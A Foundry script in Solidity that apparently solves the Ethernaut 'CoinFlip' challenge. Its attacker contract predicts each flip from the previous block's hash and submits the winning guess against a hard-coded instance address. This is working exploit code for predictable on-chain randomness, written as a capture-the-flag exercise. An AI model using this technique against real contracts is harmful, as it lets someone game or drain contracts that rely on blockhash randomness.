// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public inst;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address inatanceAddress) {
        inst = CoinFlip(inatanceAddress);
    }
    
    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        inst.flip(side);

        console.log(inst.consecutiveWins());
    }
}

contract CoinFlipSolution is Script {
    function run() external {
        address coinfllipInstanseAddrs = 0xECfd6Ea4910e66594605e5f66D6a4cD26E178661;
        vm.startBroadcast();
        
        CoinFlipAttack attacker = new CoinFlipAttack(coinfllipInstanseAddrs);
        attacker.attack();
        vm.stopBroadcast();
    }
}
